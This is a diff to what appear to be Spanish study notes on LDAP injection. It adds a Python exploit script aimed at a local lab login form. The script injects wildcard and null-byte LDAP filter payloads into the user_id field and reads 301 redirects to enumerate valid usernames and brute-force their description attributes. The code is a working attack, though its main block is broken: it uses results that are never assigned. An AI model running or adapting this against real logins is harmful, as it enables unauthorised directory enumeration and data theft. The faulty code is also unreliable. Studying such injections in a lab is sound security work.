@@ -125,7 +125,7 @@ Script para enumerar usuario validos, pero estos tienen atributos como:
 ❯ nano ldapi.py
 	#!/usr/bin/python3
 	from pwn import *
-	import requests, time, sys, signal
+	import requests, time, sys, signal, string
 
 	def def_handler(sig, frame):
 		print("\n\n[!] Saliendo...\n")
@@ -134,6 +134,62 @@ Script para enumerar usuario validos, pero estos tienen atributos como:
 	# Ctrl + c
 	signal.signal(signal.SIGINT, def_handler)
 
+	# Variables globales
+	main_url = "http://localhost:8888/"
+
+	def getInitialUsers():
+		characters = string.ascii_lowercase
+		initial_users = []
+		headers = {'Content-Type': 'application/x-www-form-urlencoded'}
+		for character in characters:
+			post_data = "user_id={}*&password=*&login=1&submit=Submit".format(character)
+			r = requests.post(main_url, headers=headers, data=post_data, allow_redirects=False)
+			if r.status_code == 301:
+				initial_users.append(character)
+		return initial_users
+
+	def getUsers(initial_users):
+		characters = string.ascii_lowercase + string.digits
+		headers = {'Content-Type': 'application/x-www-form-urlencoded'}
+		valid_users = []
+		for first_character in initial_users: 
+			user = ""
+			for position in range(0, 15):     
+				for character in characters:
+					post_data = "user_id={}{}{}*&password=*&login=1&submit=Submit".format(first_character, user, character)
+					r = requests.post(main_url, headers=headers, data=post_data, allow_redirects=False)
+					if r.status_code == 301:
+						user += character 
+						break
+			valid_users.append(first_character + user)
+		print("\n")
+		for user in valid_users:
+			log.info("Usuario valido encontrado: %s" % user)
+		print("\n")
+		return valid_users
+
+	def getDescription(user):                   # Para un usuario especifico
+		characters = string.ascii_lowercase + ' '
+		headers = {'Content-Type': 'application/x-www-form-urlencoded'}	
+		description = ""
+		p1 = log.progress("Fuerza Bruta")
+		p1.status("Iniciando fuerza bruta")
+		time.sleep(2)
+		p2 = log.progress("Descripcion")
+		for position in range(0, 50):
+			for character in characters:
+				post_data = "user_id={})(description={}{}*))%00*&password=*&login=1&submit=Submit".format(user, description, character)
+				r = requests.post(main_url, headers=headers, data=post_data, allow_redirects=False)
+				if r.status_code == 301:
+					description += character 
+					p2.status(description)
+					break
+		p1.success("Proceso de Fuerza Bruta concluido")
+		p2.success("La descripcion del usuario es: %s" % description)
 
 	if __name__ == '__main__':
+	getInitialUsers()
+	getUsers(initial_users)
+	for i in range(0, 5):
+		getDescription(valid_users[i])
 ```
